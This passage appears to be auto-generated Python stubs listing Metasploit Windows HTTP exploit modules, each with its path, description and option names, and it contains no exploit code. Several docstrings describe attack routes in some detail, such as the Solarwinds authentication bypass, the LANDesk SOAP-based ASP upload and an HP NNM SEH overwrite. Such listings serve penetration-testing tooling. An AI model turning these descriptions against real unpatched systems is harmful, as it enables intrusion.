			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			required_TARGETURI = 'TARGETURI'

	class windows_http_solarwinds_fsm_userlogin(object):
		"""
		
        This module exploits multiple vulnerabilities found in Solarwinds Firewall Security Manager
        6.6.5. The first vulnerability is an authentication bypass via the Change Advisor interface
        due to a user-controlled session.putValue API in userlogin.jsp, allowing the attacker to set
        the 'username' attribute before authentication. The second problem is that the settings-new.jsp
        file will only check the 'username' attribute before authorizing the 'uploadFile' action,
        which can be exploited and allows the attacker to upload a fake xls host list file to the
        server, and results in arbitrary code execution under the context of SYSTEM.

        Depending on the installation, by default the Change Advisor web server is listening on port
        48080 for an express install. Otherwise, this service may appear on port 8080.

        Solarwinds has released a fix for this vulnerability as FSM-v6.6.5-HotFix1.zip, noted in the
        references for this module.
      
		"""

		path = 'windows/http/solarwinds_fsm_userlogin'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			FileDropperDelay = 'FileDropperDelay'
			required_TARGETURI = 'TARGETURI'

	class windows_http_hp_nnm_snmp(object):
		"""
		
          This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.50.
          By sending a specially crafted CGI request to Snmp.exe, an attacker may be able to execute
          arbitrary code.
      
		"""

		path = 'windows/http/hp_nnm_snmp'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_maxdb_webdbm_database(object):
		"""
		
          This module exploits a stack buffer overflow in the MaxDB WebDBM
        service. By sending a specially-crafted HTTP request that contains
        an overly long database name. A remote attacker could overflow a buffer
        and execute arbitrary code on the system with privileges of the wahttp process.

        This module has been tested against MaxDB 7.6.00.16 and MaxDB 7.6.00.27.
      
		"""

		path = 'windows/http/maxdb_webdbm_database'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_http_mailenable_auth_header(object):
		"""
		
          This module exploits a remote buffer overflow in the MailEnable web service.
        The vulnerability is triggered when a large value is placed into the Authorization
        header of the web request. MailEnable Enterprise Edition versions priot to 1.0.5 and
        MailEnable Professional versions prior to 1.55 are affected.
      
		"""

		path = 'windows/http/mailenable_auth_header'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_kolibri_http(object):
		"""
		
        This exploits a stack buffer overflow in version 2 of the Kolibri HTTP server.
      
		"""

		path = 'windows/http/kolibri_http'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_ipswitch_wug_maincfgret(object):
		"""
		
          This module exploits a buffer overflow in IPswitch WhatsUp Gold 8.03. By
        posting a long string for the value of 'instancename' in the _maincfgret.cgi
        script an attacker can overflow a buffer and execute arbitrary code on the system.
      
		"""

		path = 'windows/http/ipswitch_wug_maincfgret'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTPUSER = 'HTTPUSER'
			HTTPPASS = 'HTTPPASS'

	class windows_http_zenworks_assetmgmt_uploadservlet(object):
		"""
		
          This module exploits a path traversal flaw in Novell ZENworks Asset Management
        7.5. By exploiting the CatchFileServlet, an attacker can upload a malicious file
        outside of the MalibuUploadDirectory and then make a secondary request that allows
        for arbitrary code execution.
      
		"""

		path = 'windows/http/zenworks_assetmgmt_uploadservlet'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_DEPTH = 'DEPTH'

	class windows_http_ia_webmail(object):
		"""
		
          This exploits a stack buffer overflow in the IA WebMail server.
        This exploit has not been tested against a live system at
        this time.
      
		"""

		path = 'windows/http/ia_webmail'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_bea_weblogic_post_bof(object):
		"""
		
          This module exploits a stack based buffer overflow in the BEA
        Weblogic Apache plugin.

        The connector fails to properly handle specially crafted HTTP POST
        requests, resulting a buffer overflow due to the insecure usage
        of sprintf.  Currently, this module works over Windows systems without DEP,
        and has been tested with Windows 2000 / XP.

        In addition, the Weblogic Apache plugin version is fingerprinted with a POST
        request containing a specially crafted Transfer-Encoding header.
      
		"""

		path = 'windows/http/bea_weblogic_post_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			required_TARGETURI = 'TARGETURI'

	class windows_http_landesk_thinkmanagement_upload_asp(object):
		"""
		
          This module can be used to execute a payload on LANDesk Lenovo
        ThinkManagement Suite 9.0.2 and 9.0.3.

        The payload is uploaded as an ASP script by sending a specially crafted
        SOAP request to "/landesk/managementsuite/core/core.anonymous/ServerSetup.asmx"
        , via a "RunAMTCommand" operation with the command '-PutUpdateFileCore'
        as the argument.

        After execution, the ASP script with the payload is deleted by sending
        another specially crafted SOAP request to "WSVulnerabilityCore/VulCore.asmx"
        via a "SetTaskLogByFile" operation.
      
		"""

		path = 'windows/http/landesk_thinkmanagement_upload_asp'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_PATH = 'PATH'

	class windows_http_hp_nnm_ovwebsnmpsrv_main(object):
		"""
		
          This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53
        prior to NNM_01203. By specifying a long 'arg' parameter when executing the 'jovgraph.exe'
        CGI program, an attacker can cause a stack-based buffer overflow and execute arbitrary code.

        This vulnerability is triggerable via either a GET or POST request. The buffer being
        written to is 1024 bytes in size. It is important to note that this vulnerability must
        be exploited by overwriting SEH. Otherwise, CVE-2010-1961 is triggered!

        The vulnerable code is within the "main" function within "ovwebsnmpsrv.exe" with a
        timestamp prior to April 7th, 2010. There are no stack cookies, so exploitation is
        easily achieved by overwriting SEH structures.

        There exists some unreliability when running this exploit. It is not completely clear why
        at this time, but may be related to OVWDB or session management. Also, on some attempts
        OV NNM may report invalid characters in the URL. It is not clear what is causing this
        either.
      
		"""

		path = 'windows/http/hp_nnm_ovwebsnmpsrv_main'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_http_sysax_create_folder(object):
		"""
		
          This module exploits a stack buffer overflow in the create folder function in
        Sysax Multi Server 5.64. This issue was fixed in 5.66. In order to trigger the
        vulnerability valid credentials with the create folder permission must be provided.
        The HTTP option must be enabled on Sysax too.

        This module will log into the server, get a SID token, find the root folder, and
